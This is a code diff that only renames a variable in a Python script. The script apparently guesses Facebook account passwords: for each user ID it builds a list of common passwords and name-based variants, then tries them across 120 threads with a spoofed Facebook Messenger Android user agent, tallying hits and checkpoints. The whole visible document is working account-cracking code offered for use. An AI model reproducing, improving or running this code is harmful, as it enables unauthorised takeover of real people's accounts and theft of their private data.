@@ -134,19 +134,19 @@ def gxdsforward(id_file):
     with ThreadPool(max_workers=120) as feel:
         for data in id_file:
             uid = data.split("|")[0]
-            gxdspwd = []
-            gxdspwd.append("12345678")
-            gxdspwd.append("P@ssw0rd")
-            gxdspwd.append("123456")
-            gxdspwd.append("iloveyou")
-            gxdspwd.append("iloveyou123")
-            gxdspwd.append("1234567890")
-            gxdspwd.append("password")
-            gxdspwd.append("password123")
-            gxdspwd.append("Password")
-            gxdspwd.append("Password123")
-            gxdspwd.append("qwerty123")
-            gxdspwd.append("123456789")
+            gxdspw = []
+            gxdspw.append("12345678")
+            gxdspw.append("P@ssw0rd")
+            gxdspw.append("123456")
+            gxdspw.append("iloveyou")
+            gxdspw.append("iloveyou123")
+            gxdspw.append("1234567890")
+            gxdspw.append("password")
+            gxdspw.append("password123")
+            gxdspw.append("Password")
+            gxdspw.append("Password123")
+            gxdspw.append("qwerty123")
+            gxdspw.append("123456789")
             gxdsnam = data.split("|")[1]
             name = gxdsnam.lower()
             try:
@@ -155,17 +155,17 @@ def gxdsforward(id_file):
                 if len(f_name) < 3:
                     pass
                 else:
-                    gxdspwd.append(gxdsnam1 + "123")
-                    gxdspwd.append(f_name + "12")
-                    gxdspwd.append(f_name + "123")
-                    gxdspwd.append(f_name + "123")
-                    gxdspwd.append(f_name + "1234")
-                    gxdspwd.append(f_name + "12345")
-                    gxdspwd.append(f_name + "@123")
-                    gxdspwd.append(f_name + "pogi")
-                    gxdspwd.append(f_name + "ganda")
-                    gxdspwd.append(f_name + "143")
-                    gxdspwd.append(f_name + "@143")
+                    gxdspw.append(gxdsnam1 + "123")
+                    gxdspw.append(f_name + "12")
+                    gxdspw.append(f_name + "123")
+                    gxdspw.append(f_name + "123")
+                    gxdspw.append(f_name + "1234")
+                    gxdspw.append(f_name + "12345")
+                    gxdspw.append(f_name + "@123")
+                    gxdspw.append(f_name + "pogi")
+                    gxdspw.append(f_name + "ganda")
+                    gxdspw.append(f_name + "143")
+                    gxdspw.append(f_name + "@143")
             except:
                 pass
             try:
@@ -174,31 +174,31 @@ def gxdsforward(id_file):
                 if len(mid_name) < 3:
                     pass
                 else:
-                    gxdspwd.append(gxdsnam1 + " " + gxdsnam2)
-                    gxdspwd.append(mid_name + "12")
-                    gxdspwd.append(mid_name + "123")
-                    gxdspwd.append(mid_name + " 123")
-                    gxdspwd.append(mid_name + "1234")
-                    gxdspwd.append(mid_name + "12345")
-                    gxdspwd.append(mid_name + "@#")
-                    gxdspwd.append(mid_name + "@@")
-                    gxdspwd.append(mid_name + "@")
-                    gxdspwd.append(mid_name + "@123")
+                    gxdspw.append(gxdsnam1 + " " + gxdsnam2)
+                    gxdspw.append(mid_name + "12")
+                    gxdspw.append(mid_name + "123")
+                    gxdspw.append(mid_name + " 123")
+                    gxdspw.append(mid_name + "1234")
+                    gxdspw.append(mid_name + "12345")
+                    gxdspw.append(mid_name + "@#")
+                    gxdspw.append(mid_name + "@@")
+                    gxdspw.append(mid_name + "@")
+                    gxdspw.append(mid_name + "@123")
                     # -Mix
-                    gxdspwd.append(f_name + mid_name)
-                    gxdspwd.append(f_name + mid_name + "143")
-                    gxdspwd.append(f_name + mid_name + "12")
-                    gxdspwd.append(f_name + mid_name + "123")
-                    gxdspwd.append(f_name + mid_name + "1234")
-                    gxdspwd.append(f_name + mid_name + "12345")
-                    gxdspwd.append(f_name + mid_name + "@#")
-                    gxdspwd.append(f_name + mid_name + "@@")
-                    gxdspwd.append(f_name + mid_name + "@")
-                    gxdspwd.append(f_name + mid_name + "@123")
-                    gxdspwd.append(f_name + " " + mid_name)
-                    gxdspwd.append(f_name + " " + mid_name + "123")
-                    gxdspwd.append(f_name + " " + mid_name + "143")
-                    gxdspwd.append(f_name + " " + mid_name + "1234")
+                    gxdspw.append(f_name + mid_name)
+                    gxdspw.append(f_name + mid_name + "143")
+                    gxdspw.append(f_name + mid_name + "12")
+                    gxdspw.append(f_name + mid_name + "123")
+                    gxdspw.append(f_name + mid_name + "1234")
+                    gxdspw.append(f_name + mid_name + "12345")
+                    gxdspw.append(f_name + mid_name + "@#")
+                    gxdspw.append(f_name + mid_name + "@@")
+                    gxdspw.append(f_name + mid_name + "@")
+                    gxdspw.append(f_name + mid_name + "@123")
+                    gxdspw.append(f_name + " " + mid_name)
+                    gxdspw.append(f_name + " " + mid_name + "123")
+                    gxdspw.append(f_name + " " + mid_name + "143")
+                    gxdspw.append(f_name + " " + mid_name + "1234")
             except:
                 pass
             try:
@@ -207,26 +207,26 @@ def gxdsforward(id_file):
                 if len(sur_name) < 3:
                     pass
                 else:
-                    gxdspwd.append(gxdsnam1 + " " + gxdsnam3)
-                    gxdspwd.append(sur_name + "123")
-                    gxdspwd.append(sur_name + "1234")
-                    gxdspwd.append(sur_name + "12345")
-                    gxdspwd.append(sur_name + "143")
-                    gxdspwd.append(f_name + mid_name + sur_name)
-                    gxdspwd.append(f_name + mid_name + sur_name + "123")
-                    gxdspwd.append(f_name + mid_name + sur_name + "1234")
-                    gxdspwd.append(f_name + mid_name + sur_name + "12345")
-                    gxdspwd.append(f_name + mid_name + sur_name + "@#")
-                    gxdspwd.append(f_name + mid_name + sur_name + "@@")
-                    gxdspwd.append(f_name + mid_name + sur_name + "@")
-                    gxdspwd.append(f_name + " " + sur_name)
-                    gxdspwd.append(f_name + " " + sur_name + "123")
-                    gxdspwd.append(f_name + " " + sur_name + "143")
-                    gxdspwd.append(f_name + " " + mid_name + " " + sur_name)
-                    gxdspwd.append(f_name + " " + mid_name + " " + sur_name + "123")
+                    gxdspw.append(gxdsnam1 + " " + gxdsnam3)
+                    gxdspw.append(sur_name + "123")
+                    gxdspw.append(sur_name + "1234")
+                    gxdspw.append(sur_name + "12345")
+                    gxdspw.append(sur_name + "143")
+                    gxdspw.append(f_name + mid_name + sur_name)
+                    gxdspw.append(f_name + mid_name + sur_name + "123")
+                    gxdspw.append(f_name + mid_name + sur_name + "1234")
+                    gxdspw.append(f_name + mid_name + sur_name + "12345")
+                    gxdspw.append(f_name + mid_name + sur_name + "@#")
+                    gxdspw.append(f_name + mid_name + sur_name + "@@")
+                    gxdspw.append(f_name + mid_name + sur_name + "@")
+                    gxdspw.append(f_name + " " + sur_name)
+                    gxdspw.append(f_name + " " + sur_name + "123")
+                    gxdspw.append(f_name + " " + sur_name + "143")
+                    gxdspw.append(f_name + " " + mid_name + " " + sur_name)
+                    gxdspw.append(f_name + " " + mid_name + " " + sur_name + "123")
             except:
                 pass
-            feel.submit(file_subb, uid, gxdspwd)
+            feel.submit(file_subb, uid, gxdspw)
 
 
 loop = 0
@@ -234,7 +234,7 @@ oks = []
 cps = []
 
 
-def file_subb(uid, gxdspwd):
+def file_subb(uid, gxdspw):
     global oks, loop, cps
     sys.stdout.write(
         f"\r \033[1;97m [CHECKED]: {loop} [HITS]: {str(len(oks))} [CHECKPOINT]: {str(len(cps))}"
@@ -242,7 +242,7 @@ def file_subb(uid, gxdspwd):
     sys.stdout.flush()
     session = requests.Session()
     try:
-        for ps in gxdspwd:
+        for ps in gxdspw:
             user_agent = "Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
             data = {
                 "adid": str(uuid.uuid4()),
